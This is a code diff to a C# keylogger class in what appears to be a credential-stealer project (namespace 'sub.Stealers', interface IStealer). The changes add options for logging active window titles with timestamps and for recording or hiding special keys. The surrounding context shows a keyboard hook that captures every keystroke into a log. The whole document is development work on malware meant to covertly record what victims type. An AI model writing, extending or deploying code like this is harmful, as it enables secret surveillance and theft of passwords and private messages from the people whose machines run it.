@@ -86,17 +86,20 @@ namespace sub.Stealers
 
         #endregion
 
-        private bool _capslock;
         private string _name = "Keylogger";
+        private string _windowTitle;
+        private bool _shift, _capslock, _showFullResults, _includeWindowTitles;
 
-        private bool _shift;
-        private string _windowTitle = "";
+        public Keylogger() : this(true, true) {}
 
-        public Keylogger()
+        public Keylogger(bool showFullResults, bool includeWindowTitles)
         {
             _proc = HookCallback;
             _shift = false;
             _capslock = false;
+            _windowTitle = "";
+            _showFullResults = showFullResults;
+            _includeWindowTitles = includeWindowTitles;
         }
 
         #region IStealer Members
@@ -124,9 +127,10 @@ namespace sub.Stealers
         {
             //look for a change in the window title, if so add it to the log
             //Note: due to the lack of a desire to waste CPU cycles to check for it every time, the log will always start with \r\n which isn't a huge deal
-            if (_windowTitle != GetActiveWindowTitle())
+            if (_includeWindowTitles && _windowTitle != GetActiveWindowTitle())
             {
-                Data += "------------";
+                //removed for now because it would put the -'s immediately after the logged keys which makes reading somewhat difficult
+                //Data += "------------";
                 _windowTitle = GetActiveWindowTitle();
                 Data += string.Format("\r\n[{0}][{1}]\r\n", DateTime.Now, _windowTitle);
             }
@@ -248,7 +252,8 @@ namespace sub.Stealers
                         Data += _shift ? "\"" : "'";
                         break;
                     default:
-                        Data += "[" + (Keys) code + "]";
+                        if (_showFullResults)
+                            Data += "[" + (Keys) code + "]";
                         break;
                 }
             }
